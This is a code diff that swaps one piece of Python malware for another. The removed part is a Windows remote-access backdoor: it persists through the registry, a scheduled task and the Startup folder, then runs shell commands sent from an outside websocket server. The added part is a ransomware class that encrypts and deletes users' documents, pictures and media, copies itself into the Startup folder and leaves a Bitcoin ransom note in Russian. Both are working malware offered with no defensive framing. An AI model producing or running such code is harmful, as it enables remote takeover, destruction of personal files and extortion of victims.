@@ -1,77 +1,56 @@
 import os
 import sys
-import winreg
-import shutil
-import socket
-import subprocess
-import requests
-import ctypes
-import json
-import ssl
-import time
-from datetime import datetime, timedelta
+import threading
+from cryptography.fernet import Fernet
 
-def add_to_registry():
-    try:
-        key = winreg.HKEY_CURRENT_USER
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
-            winreg.SetValueEx(registry_key, "SystemService", 0, winreg.REG_SZ, sys.executable)
-    except Exception:
-        pass
-
-def add_to_scheduler():
-    try:
-        task_name = "SystemMaintenance"
-        schtasks_cmd = [
-            'schtasks', '/create', '/tn', task_name, '/tr', sys.executable,
-            '/sc', 'onlogon', '/rl', 'highest', '/f'
+class Ransomware:
+    def __init__(self):
+        self.key = Fernet.generate_key()
+        self.cipher = Fernet(self.key)
+        self.target_dirs = [
+            os.path.expanduser('~/' + path) for path in [
+                'Documents', 'Desktop', 'Pictures', 
+                'Videos', 'Downloads', 'Music'
+            ]
         ]
-        subprocess.run(schtasks_cmd, capture_output=True)
-    except Exception:
-        pass
-
-def add_to_startup():
-    try:
-        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        target_path = os.path.join(startup_path, 'system_service.exe')
-        if not os.path.exists(target_path):
-            shutil.copyfile(sys.executable, target_path)
-    except Exception:
-        pass
-
-def connect_to_websocket():
-    server_url = "wss://lol-8jcf.onrender.com/ws"
+        self.extensions = [
+            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf',
+            '.jpg', '.jpeg', '.png', '.bmp', '.avi', '.mp4',
+            '.mp3', '.wav', '.zip', '.rar', '.7z'
+        ]
     
-    while True:
+    def encrypt_file(self, file_path):
         try:
-            import websocket
-            ws = websocket.create_connection(server_url)
-            
-            while True:
-                try:
-                    command = ws.recv()
-                    if not command:
-                        break
-                    
-                    if command == 'exit':
-                        break
-                    
-                    try:
-                        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-                        output = result.stdout + result.stderr
-                    except Exception as e:
-                        output = str(e)
-                    
-                    ws.send(output)
-                except Exception:
-                    break
-                    
-        except Exception:
-            time.sleep(30)
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            encrypted_data = self.cipher.encrypt(data)
+            with open(file_path + '.ENCRYPTED', 'wb') as f:
+                f.write(encrypted_data)
+            os.remove(file_path)
+        except:
+            pass
+    
+    def spread(self):
+        for directory in self.target_dirs:
+            if os.path.exists(directory):
+                for root, _, files in os.walk(directory):
+                    for file in files:
+                        if any(file.endswith(ext) for ext in self.extensions):
+                            file_path = os.path.join(root, file)
+                            threading.Thread(target=self.encrypt_file, args=(file_path,)).start()
+    
+    def persist(self):
+        if sys.platform == 'win32':
+            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            with open(os.path.join(startup_dir, 'system_update.py'), 'w') as f:
+                f.write(open(__file__).read())
+    
+    def execute(self):
+        self.persist()
+        self.spread()
+        with open('README_RANSOM.txt', 'w') as f:
+            f.write(f'Все ваши файлы зашифрованы. Для расшифровки отправьте 0.5 BTC на адрес: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\\n\\nКлюч: {self.key.decode()}')
 
-if __name__ == "__main__":
-    add_to_registry()
-    add_to_scheduler()
-    add_to_startup()
-    connect_to_websocket()
+if __name__ == '__main__':
+    malware = Ransomware()
+    malware.execute()
